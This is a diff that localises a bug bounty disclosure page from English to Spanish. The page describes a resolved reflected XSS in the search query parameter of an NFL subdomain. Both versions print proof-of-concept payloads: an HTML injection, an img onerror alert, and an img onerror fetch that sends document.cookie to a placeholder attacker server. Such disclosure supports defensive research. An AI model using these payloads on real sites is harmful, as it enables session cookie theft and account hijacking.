@@ -6,44 +6,44 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
 
 <div class="container">
   <div class="lang-switcher">
-    <a href="/es/bounties/nfl-xss-search-query/" class="lang-btn"><span class="label-full">Español (ES)</span><span class="label-short">ES</span></a>
-    <a href="./" class="lang-btn active"><span class="label-full">English (EN)</span><span class="label-short">EN</span></a>
+    <a href="/en/bounties/e8471382-6e56-4e74-b4e2-ff20279371ff/" class="lang-btn"><span class="label-full">English (EN)</span><span class="label-short">EN</span></a>
+    <a href="./" class="lang-btn active"><span class="label-full">Español (ES)</span><span class="label-short">ES</span></a>
   </div>
 <article>
-  <a href="/en/" class="back-btn">
+  <a href="/es/" class="back-btn">
     <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
     {{ site.title }}
   </a>
 
   <div class="bounty-header">
-    <h1>Reflected XSS in URL Search Query Parameter</h1>
+    <h1>XSS Reflejado en Parámetro de Query de Búsqueda en URL</h1>
     <p style="color: var(--p3); font-weight: 600;">National Football League (NFL)</p>
   </div>
 
   <div class="bounty-content">
-    <h2>🎯 Vulnerability Summary</h2>
-    <p>We identified a Reflected Cross-Site Scripting (XSS) vulnerability on the public-facing domain <code>[REDACTED].nfl.com</code>. The vulnerability resides in the search results page URL fragment (<code>?q=</code>) parameter, which improperly processes user-supplied input without adequate sanitization.</p>
+    <h2>🎯 Resumen de la Vulnerabilidad</h2>
+    <p>Identificamos una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en el dominio público <code>[REDACTED].nfl.com</code>. La vulnerabilidad reside en el parámetro del fragmento de URL de la página de resultados de búsqueda (<code>?q=</code>), que procesa incorrectamente la entrada del usuario sin el saneamiento adecuado.</p>
 
-    <h2>🛠️ Proof of Concept Payloads</h2>
+    <h2>🛠️ Payloads de Prueba de Concepto</h2>
     
-    <h3>HTML Injection</h3>
-    <p>The first thing we tried in the search field was a simple HTML injection:</p>
+    <h3>Inyección HTML</h3>
+    <p>Lo primero que probamos en el campo de búsqueda fue una simple inyección HTML:</p>
     <pre><code>&lt;h1&gt;This is a HTML Injection test&lt;/h1&gt; --- This is a normal text.</code></pre>
-    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - HTML Injection.png" alt="HTML Injection">
+    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/c66b7ce8002a0bc07c1e01756b0f7b6f.png" alt="Inyección HTML">
 
-    <h3>Reflected XSS</h3>
-    <p>After testing several payloads, we discovered that the <code>&lt;img&gt;</code> tag works:</p>
+    <h3>XSS Reflejado</h3>
+    <p>Después de probar varios payloads, descubrimos que la etiqueta <code>&lt;img&gt;</code> funciona:</p>
     <pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
-    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Alert 1.png" alt="Alert Proof">
+    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/ff5e6f6181a879b65dee22d396ac3c75.png" alt="Prueba de Alerta">
 
-    <h3>Reflected XSS with Cookies exfiltration</h3>
-    <p>After verifying that we could execute JavaScript code, we attempted to exfiltrate cookies to steal session data.</p>
-    <pre><code>&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></pre>
-    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration.png" alt="Cookies Exfiltration Payload">
-    <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration Result.png" alt="Exfiltration Result">
+    <h3>XSS Reflejado con exfiltración de Cookies</h3>
+    <p>Tras verificar que podíamos ejecutar código JavaScript, intentamos exfiltrar las cookies para robar datos de sesión.</p>
+    <pre><code>&lt;img/src/onerror=fetch("http://tu-servidor-web/"+encodeURIComponent(document.cookie))&gt;</code></pre>
+    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/52b7f32d1681e1aa49561d1b6e8f52c9.png" alt="Payload de Exfiltración de Cookies">
+    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/7b0e77b3db46e0d8de3558376f153ed0.png" alt="Resultado de la Exfiltración">
 
-    <h2>🤝 Collaboration Details</h2>
-    <p>This research was conducted in a joint effort with the following researchers:</p>
+    <h2>🤝 Detalle de Colaboración</h2>
+    <p>Esta investigación fue realizada en un esfuerzo conjunto con los siguientes investigadores:</p>
     <div class="collab-grid">
       <div class="collab-card">
         <div class="collab-avatar">
@@ -91,11 +91,10 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
             <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"></path></svg>
           </div>
           <div class="meta-title">
-            <small>Status</small>
-            <strong>Resolved</strong>
+            <strong>Estado</strong>
           </div>
         </div>
-        <div class="meta-badge success">Resolved</div>
+        <div class="meta-badge success">Resuelto</div>
       </div>
 
       <div class="meta-card">
@@ -104,22 +103,22 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
             <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 9v4"></path><path d="M12 17h.01"></path><path d="M10.29 3.86l-8.12 14.06A2 2 0 0 0 3.9 21h16.2a2 2 0 0 0 1.73-3.08L13.71 3.86a2 2 0 0 0-3.42 0z"></path></svg>
           </div>
           <div class="meta-title">
-            <strong>Severity</strong>
+            <strong>Severidad</strong>
           </div>
         </div>
-        <div class="meta-badge badge badge-p3">Medium</div>
+        <div class="meta-badge badge badge-p3">Media</div>
       </div>
     </div>
 
     <div class="verification-panel">
-      <h3>Verification</h3>
+      <h3>Verificación</h3>
       <div class="verification-grid">
         <div class="verification-item">
-          <small>Submission ID</small>
+          <small>ID de la submission</small>
           <div class="value">{{ page.submission_id | default: 'N/A' }}</div>
         </div>
         <div class="verification-item">
-          <small>Official Link</small>
+          <small>Enlace oficial</small>
           <div class="value">
             {% if page.official_link %}
               <a href="{{ page.official_link }}" target="_blank" rel="noopener noreferrer">{{ page.official_link }}</a>
@@ -136,7 +135,7 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
 
 <!-- Image Zoom Overlay -->
 <div id="zoomOverlay" class="zoom-overlay">
-  <img id="zoomImg" src="" alt="Zoomed Image">
+  <img id="zoomImg" src="" alt="Imagen Ampliada">
 </div>
 
 <script>
